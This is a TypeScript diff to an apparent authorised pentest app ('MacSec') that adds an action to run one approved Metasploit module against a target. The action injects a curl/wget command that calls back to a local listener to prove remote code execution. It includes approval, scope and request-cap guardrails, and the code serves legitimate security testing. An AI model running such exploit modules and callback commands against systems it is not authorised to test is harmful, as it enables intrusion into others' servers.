@@ -6,10 +6,13 @@
 import { createHash, randomBytes } from 'crypto'
 import { execFile } from 'child_process'
 import { existsSync, mkdirSync, readFileSync, rmSync } from 'fs'
+import { createServer, type Server } from 'http'
+import { networkInterfaces } from 'os'
 import { join } from 'path'
 import type { ImpactEvidence, ImpactStepResult, PlannedStep } from '../../shared/impact'
 import { maskSecrets } from '../evidence'
 import { parseFfuf, pathSeverity } from '../scanners/web'
+import { msfPath, runArgs, runModule } from '../msf'
 import { dirs } from '../paths'
 import { toolPath } from '../toolbox'
 import { discoveryWords, writeWordlist } from '../wordlistfiles'
@@ -495,6 +498,131 @@ async function sqlInjectionProof(c: ActionContext): Promise<ActionResult> {
   }
 }
 
+// ---------------------------------------------------------------- Integrity: one approved Metasploit run, proved by a callback
+
+export type MsfRunRunner = (bin: string, args: string[]) => Promise<string>
+
+let msfRunner: MsfRunRunner | null = null
+
+/** Tests and the campaign can bring their own Metasploit. */
+export function setMsfRunRunner(r: MsfRunRunner | null): void {
+  msfRunner = r
+}
+
+const defaultMsfRun: MsfRunRunner = (bin, args) =>
+  new Promise((resolve, reject) => {
+    execFile(bin, args, { timeout: 5 * 60_000, maxBuffer: 8 * 1024 * 1024 }, (_e, out, err) => {
+      const text = `${String(out ?? '')}${String(err ?? '')}`
+      if (!text.trim()) reject(new Error('Metasploit did not answer.'))
+      else resolve(text)
+    })
+  })
+
+const lanIp = (): string => {
+  for (const list of Object.values(networkInterfaces())) {
+    for (const a of list ?? []) if (a.family === 'IPv4' && !a.internal && /^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/.test(a.address)) return a.address
+  }
+  return '127.0.0.1'
+}
+
+interface Callback {
+  remote: string
+  agent: string
+  path: string
+}
+
+const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms))
+
+async function msfRun(c: ActionContext): Promise<ActionResult> {
+  const { client, step } = c
+  const title = 'Run one approved Metasploit module'
+  const info = runModule(String(step.module ?? ''))
+  if (!info) return { status: 'failed', title, detail: 'Pick a module from the run-only list first. MacSec does not choose one for you.' }
+  if (!client.engagement.allowPrivate) return { status: 'failed', title, detail: 'A callback proof needs the target to reach this Mac, so the engagement must say it may test a staging server on this Mac or the local network.' }
+  let u: URL
+  try {
+    u = new URL(step.url)
+  } catch {
+    return { status: 'failed', title, detail: 'This step has no address to run against.' }
+  }
+  const host = u.hostname
+  const port = Number(u.port) || (u.protocol === 'https:' ? 443 : 80)
+  // A test may bring its own Metasploit; otherwise the real one must already be on this Mac.
+  const runner = msfRunner ?? defaultMsfRun
+  const bin = msfRunner ? 'msfconsole' : msfPath()
+  if (!bin) return { status: 'failed', title, detail: 'Metasploit is not installed on this Mac. MacSec never installs it; get it from metasploit.com.' }
+  if (client.left().requests < 1) return { status: 'not-proven', title, detail: 'The request cap is used up.' }
+  client.reserve(Math.min(12, client.left().requests), `Metasploit run ${step.module}`)
+  const marker = `macsec-${rand()}`
+  const ip = lanIp()
+  let resolveHit: (v: Callback | null) => void = () => undefined
+  const hit = new Promise<Callback | null>((r) => (resolveHit = r))
+  const server: Server = createServer((req, res) => {
+    const path = String(req.url ?? '')
+    if (path.includes(marker)) {
+      res.writeHead(200, { 'content-type': 'text/plain' })
+      res.end('macsec proof')
+      resolveHit({ remote: String(req.socket.remoteAddress ?? ''), agent: String(req.headers['user-agent'] ?? ''), path })
+      return
+    }
+    res.writeHead(404)
+    res.end()
+  })
+  await new Promise<void>((r) => server.listen(0, '0.0.0.0', () => r()))
+  const listenPort = (() => {
+    const a = server.address()
+    return a && typeof a === 'object' ? a.port : 0
+  })()
+  const callback = `http://${ip}:${listenPort}/${marker}`
+  const command = `curl -sS -m 10 ${callback} || wget -qO- -T 10 ${callback}`
+  c.line(`running ${info.title} against ${host}:${port}, waiting for the callback on ${ip}:${listenPort}`)
+  let text = ''
+  let got: Callback | null = null
+  const timeout = setTimeout(() => resolveHit(null), 60_000)
+  try {
+    text = await runner(bin, runArgs(info.module, host, port, command))
+    got = await hit
+  } catch (e) {
+    return { status: 'failed', title, detail: `Metasploit did not finish: ${(e as Error).message}` }
+  } finally {
+    clearTimeout(timeout)
+    server.close()
+  }
+  if (!got) {
+    const tail = maskSecrets(text).split('\n').filter(Boolean).slice(-3).join(' ').slice(0, 400)
+    return {
+      status: 'not-proven',
+      title,
+      detail: `Metasploit finished, but nothing called back to this Mac within a minute. The module may have failed, the target may not be able to reach ${ip}, or it may be patched. Metasploit said: ${tail || 'nothing useful'}.`
+    }
+  }
+  const leftover = info.module.includes('gitlab')
+    ? { what: 'one image uploaded by Metasploit', where: host, how: 'Remove the uploaded image from GitLab if it is still in its uploads.' }
+    : undefined
+  return {
+    status: 'proven',
+    title: `Code execution proven on ${host}:${port} (${info.title})`,
+    detail: `The ${info.title} module ran, and the command it ran called back from ${got.remote} with the marker. That is code execution: an attacker who can reach this service can run commands on the server. MacSec ran one command (a callback), opened no session and left no handler.`,
+    evidence: {
+      method: 'CALLBACK',
+      url: maskUrl(callback),
+      status: 200,
+      bytes: Buffer.byteLength('macsec proof'),
+      sha256: sha(`macsec proof ${marker}`),
+      at: now(),
+      shows: [
+        `a request arrived from ${got.remote} at ${got.path}`,
+        got.agent ? `with user agent "${got.agent.slice(0, 80)}"` : 'with no user agent',
+        `module ${info.module} (${info.cve})`,
+        'the command was a single curl or wget back to this Mac',
+        'no session, no handler and no persistence were used'
+      ]
+    },
+    cleanup: { done: true, how: 'the command ran once; the listener closed and no session is left' },
+    ...(leftover ? { leftover } : {})
+  }
+}
+
 export const RUNNERS: Record<PlannedStep['action'], (c: ActionContext) => Promise<ActionResult>> = {
   'traversal-read': traversalRead,
   'ssti-marker': sstiMarker,
@@ -503,7 +631,8 @@ export const RUNNERS: Record<PlannedStep['action'], (c: ActionContext) => Promis
   'replay-request': replayRequest,
   'content-discovery': contentDiscovery,
   'auth-bypass': authBypass,
-  'sql-injection-proof': sqlInjectionProof
+  'sql-injection-proof': sqlInjectionProof,
+  'msf-run': msfRun
 }
 
 /** The requests a step will send, in plain words, for the approval screen. */
@@ -533,6 +662,8 @@ export function previewOf(step: PlannedStep): string[] {
       return [`GET ${page} twice with no cookie and no token, looking for "${step.expect ? note(step.expect) : 'the string you will name'}"`]
     case 'sql-injection-proof':
       return [`sqlmap on "${step.param ?? 'the parameter'}" in ${page}: risk 1, level 1, boolean and error techniques, at most 80 requests, no data extracted`]
+    case 'msf-run':
+      return [`one Metasploit run of ${step.module ?? '(pick a module)'} against ${page}, with cmd/unix/generic and a callback to this Mac; no session, no handler`]
     default:
       return []
   }
